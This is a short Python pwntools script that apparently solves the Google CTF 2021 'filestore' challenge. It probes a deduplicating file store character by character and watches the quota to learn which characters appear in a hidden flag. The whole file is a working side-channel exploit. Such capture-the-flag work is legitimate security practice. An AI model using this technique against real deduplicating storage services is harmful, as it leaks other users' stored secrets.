from pwn import *
import string
import re

result = ''

conn = remote('filestore.2021.ctfcompetition.com', 1337)
conn.recv()
conn.recv()
conn.send('status\r\n')

received = conn.recvuntil('Menu').decode()
match = re.search(r'Quota: (.+)/64.000kB', received)

target_quota = match[1]

conn.close()

valid = []

for char in string.ascii_letters + string.digits + '{}_':
    conn = remote('filestore.2021.ctfcompetition.com', 1337)
    conn.recv()
    conn.send('store\r\n')
    conn.recv()
    conn.send(f'{char}\r\n')
    conn.recvuntil('Menu')

    conn.send('status\r\n')
    received = conn.recvuntil('Menu').decode()
    match = re.search(r'Quota: (.+)/64.000kB', received)

    quota = match[1]
    if quota == target_quota:
        print(f"{char} works!")
        valid.append(char)

    conn.close()

print(valid)